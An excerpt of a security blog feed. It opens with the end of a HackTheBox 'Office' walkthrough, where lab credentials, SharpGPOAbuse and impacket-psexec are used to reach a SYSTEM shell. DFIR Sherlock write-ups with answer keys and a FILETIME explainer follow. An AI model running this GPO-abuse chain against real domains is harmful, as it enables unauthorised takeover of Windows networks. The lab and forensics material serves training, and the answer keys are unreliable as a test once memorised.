</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>  evil-winrm -u &#34;hhogan&#34; -p &#34;H4ppyFtW183#&#34; -i 10.10.11.3     
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Evil-WinRM shell v3.5
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                                          
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Info: Establishing connection to remote endpoint
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  *Evil-WinRM* PS C:\Users\HHogan\Documents&gt;
</span></span></code></pre></div><h3 id="shell-as-system"><strong>Shell as system</strong></h3>
<p>I see that HHogan is in the GPO Managers group and can write to the default domain group policy. This ability allows an attacker to perform a wide variety of attacks, they can execute commands via scheduled tasks, disable or modify system services, elevate privileges and more.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; whoami /groups
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>GROUP INFORMATION
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-----------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Group Name                                  Type             SID                                           Attributes
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>=========================================== ================ ============================================= ==================================================
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OFFICE\GPO Managers                         Group            S-1-5-21-1199398058-4196589450-691661856-1117 Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; Get-GPO -All | Select-Object -ExpandProperty DisplayName
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Windows Firewall GPO
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Default Domain Policy
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Default Active Directory Settings GPO
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Default Domain Controllers Policy
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Windows Update GPO
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Windows Update Domain Policy
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Software Installation GPO
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Password Policy 
</span></span></code></pre></div><p>Now I add it to the computer as a local administrator via GPO.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>*Evil-WinRM* PS C:\programdata&gt; ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount HHogan --GPOName &#34;Default Domain Policy&#34;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] Domain = office.htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] Domain Controller = DC.office.htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] Distinguished Name = CN=Policies,CN=System,DC=office,DC=htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] SID Value of HHogan = S-1-5-21-1199398058-4196589450-691661856-1108
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] GUID of &#34;Default Domain Policy&#34; is: {31B2F340-016D-11D2-945F-00C04FB984F9}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] File exists: \\office.htb\SysVol\office.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] The GPO does not specify any group memberships.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] versionNumber attribute changed successfully
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] The version number in GPT.ini was increased successfully.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[+] Done!
</span></span></code></pre></div><p>I update windows group policy settings:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>*Evil-WinRM* PS C:\programdata&gt; gpupdate /force
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Updating policy...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Computer Policy update has completed successfully.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User Policy update has completed successfully.
</span></span></code></pre></div><p>I can easily see that HHogan are in the administrator group.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>*Evil-WinRM* PS C:\programdata&gt; net localgroup Administrators
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Alias name     Administrators
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Comment        Administrators have complete and unrestricted access to the computer/domain
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Members
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Administrator
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HHogan
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The command completed successfully.
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>impacket<span style="color:#ff79c6">-</span>psexec<span style="color:#ff79c6">.</span>py HHogan:H4ppyFtW183<span style="color:#6272a4">#@10.10.11.3   </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Impacket v0<span style="color:#ff79c6">.</span><span style="color:#bd93f9">12.0</span><span style="color:#ff79c6">.</span>dev1<span style="color:#ff79c6">+</span><span style="color:#bd93f9">20230907.33311</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">3</span>f645107 <span style="color:#ff79c6">-</span> Copyright <span style="color:#bd93f9">2023</span> Fortra
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">*</span>] Requesting shares on <span style="color:#bd93f9">10.10</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">11.3</span><span style="color:#ff79c6">.....</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">*</span>] Found writable share ADMIN<span style="color:#ff79c6">$</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">*</span>] Uploading file kbuDcLOn<span style="color:#ff79c6">.</span>exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">*</span>] Opening SVCManager on <span style="color:#bd93f9">10.10</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">11.3</span><span style="color:#ff79c6">.....</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">*</span>] Creating service NOKZ on <span style="color:#bd93f9">10.10</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">11.3</span><span style="color:#ff79c6">.....</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">*</span>] Starting service NOKZ<span style="color:#ff79c6">.....</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ff79c6">!</span>] Press help <span style="color:#ff79c6">for</span> extra shell commands
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Microsoft Windows [Version <span style="color:#bd93f9">10.0</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">20348.2322</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>(c) Microsoft Corporation<span style="color:#ff79c6">.</span> All rights reserved<span style="color:#ff79c6">.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>C:\Windows\system32<span style="color:#ff79c6">&gt;</span> whoami
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nt authority\system
</span></span></code></pre></div><h2 id="reference">Reference</h2>
<p><a href="https://namiq.net/blog/htb-office-writeup-hackthebox">For root flag I followed namiq.net&rsquo;s walkthrough.</a></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>HTB Sherlock Noted</title>
      <link>https://hshakilst.github.io/posts/htb-sherlocks/noted/</link>
      <pubDate>Thu, 16 May 2024 12:59:39 +0200</pubDate>
      
      <guid>https://hshakilst.github.io/posts/htb-sherlocks/noted/</guid>
      <description><![CDATA[<h1 id="noted-dfir">Noted (DFIR)</h1>
<h3 id="scenario">Scenario</h3>
<p>Simon, a developer working at Forela, notified the CERT team about a note that appeared on his desktop. The note claimed that his system had been compromised and that sensitive data from Simon&rsquo;s workstation had been collected. The perpetrators performed data extortion on his workstation and are now threatening to release the data on the dark web unless their demands are met. Simon&rsquo;s workstation contained multiple sensitive files, including planned software projects, internal development plans, and application codebases. The threat intelligence team believes that the threat actor made some mistakes, but they have not found any way to contact the threat actors. The company&rsquo;s stakeholders are insisting that this incident be resolved and all sensitive data be recovered. They demand that under no circumstances should the data be leaked. As our junior security analyst, you have been assigned a specific type of DFIR (Digital Forensics and Incident Response) investigation in this case. The CERT lead, after triaging the workstation, has provided you with only the Notepad++ artifacts, suspecting that the attacker created the extortion note and conducted other activities with hands-on keyboard access. Your duty is to determine how the attack occurred and find a way to contact the threat actors, as they accidentally locked out their own contact information.</p>
<h3 id="forensics">Forensics</h3>
<ul>
<li>
<p><strong>Artifacts</strong>: The artifacts are from <code>Notepad++</code> software. We have two XML files named <code>config.xml</code> and <code>session.xml</code>. We are also provided with two backup files of two text files <code>LootAndPurge.java@2023-07-24_145332</code> and <code>YOU HAVE BEEN HACKED.txt@2023-07-24_150548</code>.</p>
</li>
<li>
<p><strong>Extraction</strong>: The files were all in plaintext format and the volume of data was low, so extraction was not necessary. However, five files were created for classification purposes. They are <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Noted/file_history.txt">file history of recently opened files</a>, <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Noted/edited_files.txt">edited files in the alleged Notepad++</a>, <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Noted/custom_uris.txt">custom URIs the alleged Notepad++ was set to handle</a>, <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Noted/LootAndPurge.java">malicious data extortion java file</a> and <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Noted/YOU%20HAVE%20BEEN%20HACKED.txt">a ransom note file</a></p>
</li>
<li>
<p><strong>Analysis</strong>:</p>
<p>First, I examined the <code>config.xml</code> file and found some file histories. The history contained the file addresses that were recently opened by the user. I have listed them in the <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Noted/file_history.txt"><code>file_history.txt</code></a> file. Also, I found some custom URIs that were set to handle files from different types of services. They are listed in the <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Noted/custom_uris.txt"><code>custom_uris.txt</code></a> file.</p>
<p>Second, I analyzed the <code>session.xml</code> file and there I found two files that were being edited along with their backup file locations and last modified timestamps. I added them to a file named <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Noted/edited_files.txt"><code>edited_files.txt</code></a> with the findings.</p>
<p>Finally, I inspected the backup files and discovered a malicious <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Noted/LootAndPurge.java">Java source file</a>(LootAndPurge.java) that was used to encrypt the sensitive data and a <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Noted/YOU%20HAVE%20BEEN%20HACKED.txt">ransom note</a> where two <code>Pastebin</code> links were given to contact the cybercriminals. A password for the zip file was left behind by the perpetrators. Which can be used to decrypt the content of the zip file. The same password can be used to decrypt the <code>Pastebin</code> notes to find their Ethereum wallet address and email address.</p>
</li>
</ul>
<h3 id="tools-used">Tools Used</h3>
<ul>
<li>Visual Studio Code</li>
<li>Python3</li>
</ul>
<h3 id="questions-and-answers">Questions and Answers</h3>
<ul>
<li>
<p>Q1: What is the full path of the script used by Simon for AWS operations?</p>
<ul>
<li>A: <code>C:\Users\Simon.stark\Documents\Dev_Ops\AWS_objects migration.pl</code></li>
</ul>
</li>
<li>
<p>Q2: The attacker duplicated some program code and compiled it on the system, knowing that the victim was a software engineer and had all the necessary utilities. They did this to blend into the environment and didn&rsquo;t bring any of their tools. This code gathered sensitive data and prepared it for exfiltration. What is the full path of the program&rsquo;s source file?</p>
<ul>
<li>A: <code>C:\Users\simon.stark\Desktop\LootAndPurge.java</code>.</li>
</ul>
</li>
<li>
<p>Q3: What&rsquo;s the name of the final archive file containing all the data to be exfiltrated?</p>
<ul>
<li>A: <code>Forela-Dev-Data.zip</code></li>
</ul>
</li>
<li>
<p>Q4: What&rsquo;s the timestamp in UTC when attacker last modified the program source file?</p>
<ul>
<li>A: <code>2023-07-24 09:53:23</code></li>
</ul>
</li>
<li>
<p>Q5: The attacker wrote a data extortion note after exfiltrating data. What is the crypto wallet address to which attackers demanded payment?</p>
<ul>
<li>A: <code>0xca8fa8f0b631ecdb18cda619c4fc9d197c8affca</code></li>
</ul>
</li>
<li>
<p>Q6: What&rsquo;s the email address of the person to contact for support?</p>
<ul>
<li>A: <code>CyberJunkie@mail2torjgmxgexntbrmhvgluavhj7ouul5yar6ylbvjkxwqf6ixkwyd.onion</code></li>
</ul>
</li>
</ul>
<h3 id="summary">Summary</h3>
<p>Using the artifacts provided I was able to answer the questions. It was pretty straightforward. But answering Question 4 was a little bit baffling to me. It was related to Windows&rsquo;s FileTime System. I did a little bit of research and piece together an article that you can read <a href="https://hshakilst.github.io/posts/filetime/">here (FileTime)</a>. Also, I added a <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Noted/convert_splitted_filetime.py">Python script</a> to convert it into UTC.</p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>HTB Sherlock Jingle Bell</title>
      <link>https://hshakilst.github.io/posts/htb-sherlocks/jingle-bell/</link>
      <pubDate>Thu, 16 May 2024 12:54:17 +0200</pubDate>
      
      <guid>https://hshakilst.github.io/posts/htb-sherlocks/jingle-bell/</guid>
      <description><![CDATA[<h1 id="jingle-bell-dfir">Jingle Bell (DFIR)</h1>
<h3 id="scenario">Scenario</h3>
<p>Torrin is suspected to be an insider threat in Forela. He is believed to have leaked some data and removed certain applications from their workstation. They managed to bypass some controls and installed unauthorized software. Despite the forensic team&rsquo;s efforts, no evidence of data leakage was found. As a senior incident responder, you have been tasked with investigating the incident to determine the conversation between the two parties involved.</p>
<h3 id="forensics">Forensics</h3>
<p>We are given a Windows push notification database file named <code>wpndatabase.db</code>. We can learn more about this database file on:</p>
<ul>
<li><a href="https://www.mdpi.com/2673-6756/2/1/7">A Digital Forensic View of Windows 10 Notifications</a></li>
<li><a href="https://tzworks.com/prototypes/wpn/wpn.users.guide.pdf">Windows Push Notification (wpn) Database Parser Users Guide by TZWorks®</a></li>
</ul>
<p>From reading these articles we discovered that in that db file, there&rsquo;s a table named <code>Notification</code>. It contains the information of the notifications shown by Windows&rsquo;s Notification Manager as <code>XML</code> payload.</p>
<p>Therefore, we used <code>sqlitebrowser</code> and manually dumped the <code>XML</code> data from the <code>Notification</code> table. And saved them in the <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Jingle%20Bell/notifications.xml">notifications.xml</a> file.</p>
<p>We need to analyze this XML file to answer the following questions.</p>
<h3 id="questions-and-answers">Questions and Answers</h3>
<ul>
<li>
<p>Q: Which software/application did Torrin use to leak Forela&rsquo;s secrets?</p>
<ul>
<li>A: Torrin used <code>Slack</code> to leak the secrets. We know this from the notification&rsquo;s <code>&lt;toast launch=&quot;&quot;&gt;</code> section.</li>
</ul>
</li>
<li>
<p>Q: What&rsquo;s the name of the rival company to which Torrin leaked the data?</p>
<ul>
<li>A: The rival company&rsquo;s name is <code>PrimeTech Innovations</code>. We got this information from <code>&lt;header title=&quot;&quot;&gt;</code> section of the notification.</li>
</ul>
</li>
<li>
<p>Q: What is the username of the person from the competitor organization whom Torrin shared information with?</p>
<ul>
<li>A: The username is <code>Cyberjunkie-PrimeTechDev</code>. We get this answer from <code>&lt;binding&gt;</code>&rsquo;s second <code>&lt;text&gt;</code> tag where the attribute <code>hint-style=&quot;bodySubtle&quot;</code> exists.</li>
</ul>
</li>
<li>
<p>Q: What&rsquo;s the channel name in which they conversed with each other?</p>
<ul>
<li>A: The channel name is <code>forela-secrets-leak</code>. We can derive this from <code>&lt;binding&gt;</code>&rsquo;s first <code>&lt;text&gt;</code> tag where the attribute <code>hint-maxLines=&quot;1&quot;</code> exists.</li>
</ul>
</li>
<li>
<p>Q: What was the password for the archive server?</p>
<ul>
<li>A: The password for the archive server is <code>Tobdaf8Qip$re@1</code>. We get this from reading the body of a notification.</li>
</ul>
</li>
<li>
<p>Q: What was the URL provided to Torrin to upload stolen data to?</p>
<ul>
<li>A: The URL is <code>https://drive.google.com/drive/folders/1vW97VBmxDZUIEuEUG64g5DLZvFP-Pdll?usp=sharing</code>.</li>
</ul>
</li>
<li>
<p>Q: When was the above link shared with Torrin?</p>
<ul>
<li>A: When answering this question we faced some difficulties. Two timestamps could be the answer to the question. Firstly, the <code>Notification</code> table has an <code>ArrivalTime</code> timestamp expressed in <code>Microsoft Filetime 64-bit</code> format. When converted to date it gave <code>GMT Thu Apr 20 2023 10:36:08</code>. But it wasn&rsquo;t the answer. Secondly, there was another timestamp embedded inside the <code>&lt;toast launch=&quot;slack://channel?id=C05451QSQM8&amp;amp;message=1681986889.660179&amp;amp;team=T054518ADUJ&amp;amp;origin=notification&quot;&gt;</code> tag of the notification&rsquo;s XML structure. The <code>message=1681986889.660179</code> converts to <code>GMT Thu Apr 20 2023 10:34:49</code>. Turns out the latter one was the correct one. So, the answer is <code>2023-04-20 10:34:49</code>.</li>
</ul>
</li>
<li>
<p>Q: For how much money did Torrin leak Forela&rsquo;s secrets?</p>
<ul>
<li>A: The answer is <code>£10000</code>. We could find it in the <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Jingle%20Bell/notifications.xml">notifications.xml</a> file.</li>
</ul>
</li>
</ul>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>HTB Sherlock BFT</title>
      <link>https://hshakilst.github.io/posts/htb-sherlocks/bft/</link>
      <pubDate>Thu, 16 May 2024 12:44:59 +0200</pubDate>
      
      <guid>https://hshakilst.github.io/posts/htb-sherlocks/bft/</guid>
      <description><![CDATA[<h1 id="bft-dfir">BFT (DFIR)</h1>
<h3 id="scenario">Scenario</h3>
<p>In this Sherlock, you will become acquainted with MFT (Master File Table) forensics. You will be introduced to well-known tools and methodologies for analyzing MFT artifacts to identify malicious activity. During our analysis, you will utilize the MFTECmd tool to parse the provided MFT file, TimeLine Explorer to open and analyze the results from the parsed MFT, and a Hex editor to recover file contents from the MFT.</p>
<h3 id="forensics">Forensics</h3>
<ul>
<li><strong>Artifact</strong>: An MFT file <code>$MFT</code> is provided. It&rsquo;s an NTFS file system&rsquo;s master file table. <a href="https://hshakilst.github.io/posts/master-file-table/">Learn more about MFT here</a>.</li>
<li><strong>Extraction</strong>: I used <code>MFTECmd</code> to extract the contents of it and saved it to a file in CSV format.</li>
<li><strong>Analysis</strong>: <code>Timeline Explorer</code> and <code>010Editor</code> were used to answer the questions.</li>
</ul>
<h3 id="tools-used">Tools Used</h3>
<ul>
<li><a href="https://github.com/EricZimmerman/MFTECmd">MFTECmd by Eric Zimmerman</a></li>
<li><a href="https://ericzimmerman.github.io/#!index.md">Timeline Explorer</a></li>
<li><a href="https://www.sweetscape.com/download/010editor/">010Editor Hex Editor</a></li>
</ul>
<h3 id="questions-and-answers">Questions and Answers</h3>
<ul>
<li>
<p>Q1: Simon Stark was targeted by attackers on February 13. He downloaded a ZIP file from a link received in an email. What was the name of the ZIP file he downloaded from the link?</p>
<ul>
<li>A: The answer is <code>Stage-20240213T093324Z-001.zip</code>. I applied a filter on the header <code>Created0x10</code> with the date <code>2024-02-13</code> and on the header <code>Extension</code> with the value <code>.zip</code>.</li>
</ul>
</li>
<li>
<p>Q2: Examine the Zone Identifier contents for the initially downloaded ZIP file. This field reveals the HostUrl from where the file was downloaded, serving as a valuable Indicator of Compromise (IOC) in our investigation/analysis. What is the full Host URL from where this ZIP file was downloaded?</p>
<ul>
<li>
<p>A: The answer is <code>https://storage.googleapis.com/drive-bulk-export-anonymous/20240213T093324.039Z/4133399871716478688/a40aecd0-1cf3-4f88-b55a-e188d5c1c04f/1/c277a8b4-afa9-4d34-b8ca-e1eb5e5f983c?authuser</code>.</p>
<p>To find the URL of the downloaded file I needed to locate the <code>Stage-20240213T093324Z-001.zip:Zone.Identifier</code> file by applying a filter on <code>Extension</code> with the value <code>.Identifier</code>. The <code>Zone.Identifier</code> file separated by a <code>:</code> after the original file is an <strong>Alternate Data Stream (ADS)</strong> file. It contains the file&rsquo;s origin Location. In this case, it was a URL. It can be found under the <code>Zone Id Contents</code> header.</p>
</li>
</ul>
</li>
<li>
<p>Q3: What is the full path and name of the malicious file that executed malicious code and connected to a C2 server?</p>
<ul>
<li>A: The answer is <code>C:\Users\simon.stark\Downloads\Stage-20240213T093324Z-001\Stage\invoice\invoices\invoice.bat</code>. The file was found by applying a filter on the header <code>Parent Path</code> with the initial zip file&rsquo;s partial name <code>Stage</code> and a suspicious <code>.bat</code> file was discovered.</li>
</ul>
</li>
<li>
<p>Q4: Analyze the $Created0x30 timestamp for the previously identified file. When was this file created on disk?</p>
<ul>
<li>A: The answer is <code>2024-02-13 16:38:39</code>. <a href="https://hshakilst.github.io/posts/master-file-table/#timestamps">Learn more about the difference between $Created0x10 and $Created0x30</a>.</li>
</ul>
</li>
<li>
<p>Q5: Finding the hex offset of an MFT record is beneficial in many investigative scenarios. Find the hex offset of the stager file from Question 3.</p>
<ul>
<li>A: The answer is <code>16E3000</code>. To find the answer I needed to look for the malicious file&rsquo;s <code>Entry Number</code> which was <code>23436</code>. Then I multiplied it with 1024 <code>23436*1024</code> because each entry in the MFT is <code>1024 bytes</code> in size. After that, I converted the Decimal number to Hex.</li>
</ul>
</li>
<li>
<p>Q6: Each MFT record is 1024 bytes in size. If a file on disk has smaller size than 1024 bytes, they can be stored directly on MFT File itself. These are called MFT Resident files. During Windows File system Investigation, its crucial to look for any malicious/suspicious files that may be resident in MFT. This way we can find contents of malicious files/scripts. Find the contents of The malicious stager identified in Question3 and answer with the C2 IP and port.</p>
<ul>
<li>
<p>A: The answer is <code>43.204.110.203:6666</code>.</p>
<p>I had the hex offset for the <code>invoice.bat</code> file&rsquo;s entry and from the <strong>Timeline Explorer</strong>, and I discovered the <code>File Size</code> was <code>286 bytes</code>. So, it can be safely assumed it is an <a href="https://hshakilst.github.io/posts/master-file-table/#mft-resident-files"><code>MFT Resident</code> file</a>. The contents of this file can be viewed using a Hex Editor.</p>
<p>I opened up my Hex Editor went to the offset <code>16E3000</code> and found the file&rsquo;s contents. It used <code>powershell</code> to download a payload from the above IP.</p>
</li>
</ul>
</li>
</ul>
<h3 id="summary">Summary</h3>
<p>Using the MFT file I was able to discover a stager file residing in MFT and the URL which was used to deliver it initially. I also discovered a C2 server by reading the contents of that file. A timeline for this incident was also established using Timeline Explorer.</p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>Filetime</title>
      <link>https://hshakilst.github.io/posts/filetime/</link>
      <pubDate>Thu, 16 May 2024 12:14:06 +0200</pubDate>
      
      <guid>https://hshakilst.github.io/posts/filetime/</guid>
      <description><![CDATA[<h1 id="filetime-in-windows">FILETIME in Windows</h1>
<h2 id="what-is-filetime">What is FILETIME?</h2>
<p>A file time is a 64-bit value that represents the number of 100-nanosecond intervals that have elapsed since 12:00 A.M. January 1, 1601 Coordinated Universal Time (UTC). The system records file times when applications create, access, and write to files.</p>
<p>The NTFS file system stores time values in UTC format, so they are not affected by changes in time zone or daylight saving time. The FAT file system stores time values based on the local time of the computer.</p>
<p>Time stamps are updated at various times and for various reasons. The only guarantee about a file time stamp is that the file time is correctly reflected when the handle that makes the change is closed.</p>
<blockquote>
<p>Not all file systems can record creation and last access times, and not all file systems record them in the same manner. For example, the resolution of create time on FAT is 10 milliseconds, while write time has a resolution of 2 seconds and access time has a resolution of 1 day, so it is really the access date. The NTFS file system delays updates to the last access time for a file by up to 1 hour after the last access.</p>
</blockquote>
<h2 id="filetime-structure-minwinbaseh">FILETIME Structure (minwinbase.h)</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>typedef struct _FILETIME {
</span></span><span style="display:flex;"><span>  DWORD dwLowDateTime;
</span></span><span style="display:flex;"><span>  DWORD dwHighDateTime;
</span></span><span style="display:flex;"><span>} FILETIME, *PFILETIME, *LPFILETIME;
</span></span></code></pre></div><p>Here, the <code>dwLowDateTime</code> is the low-order and the <code>dwHighDateTime</code> is the high-order part of the file time.</p>
<blockquote>
<p>Older compilers did not have support for 64 bit types. So the structure splits the 64 bit value into two 32 bit parts. The low part contains the least significant 32 bits. The high part contains the most significant 32 bits.</p>
</blockquote>
<h2 id="converting-filetime-to-human-readable-format">Converting FILETIME to Human Readable Format</h2>
<p>To convert the FILETIME into human readable format we need a unsigned 64 bit integer union. But 64 bit integer support may vary compiler to compiler based on CPU architecture and OS versions. Microsoft&rsquo;s official documentation says it supports <code>ULARGE_INTEGER</code> (unsigned 64 bit integer union) from <code>Windows 10 Build 20348</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>typedef union _ULARGE_INTEGER {
